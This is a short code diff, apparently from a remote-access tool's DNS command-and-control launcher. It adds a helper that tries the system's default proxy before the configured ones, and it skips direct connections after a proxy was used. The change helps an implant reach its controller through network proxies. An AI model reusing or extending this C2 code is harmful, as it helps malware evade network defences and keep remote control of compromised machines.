@@ -7,7 +7,7 @@ from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
 from ..picocmd.client import DnsCommandsClient
 from ..picocmd.picocmd import ConnectablePort, OnlineStatus, PortQuizPort
 
-from ..proxies import get_proxies
+from ..proxies import get_proxies, find_default_proxy, LAST_PROXY
 
 from ..socks import GeneralProxyError, ProxyConnectionError, HTTPError
 
@@ -32,6 +32,14 @@ import network
 from network.lib import getLogger
 
 logger = getLogger('dnscnc')
+
+def find_proxies(additional_proxies=None):
+    proxy_info = find_default_proxy()
+    if proxy_info:
+        yield proxy_info
+
+    for proxy_info in get_proxies(additional_proxies=additional_proxies):
+        yield proxy_info
 
 class DNSCommandClientLauncher(DnsCommandsClient):
     def __init__(self, domain, ns=None, qtype='A', ns_timeout=3):
@@ -261,7 +269,7 @@ class DNSCncLauncher(BaseLauncher):
         if connection_proxy is True:
             connection_proxy = None
 
-        for proxy_type, proxy, proxy_username, proxy_password in get_proxies(
+        for proxy_type, proxy, proxy_username, proxy_password in find_proxies(
                additional_proxies=[connection_proxy] if connection_proxy else None
         ):
             t = network.conf.transports[transport](
@@ -344,7 +352,7 @@ class DNSCncLauncher(BaseLauncher):
                 logger.debug('processing connection command')
 
                 with dnscnc.lock:
-                    if command[4]:
+                    if command[4] or (LAST_PROXY is not None and command[4] is not False):
                         stream = None
                     else:
                         stream = self.try_direct_connect(command)
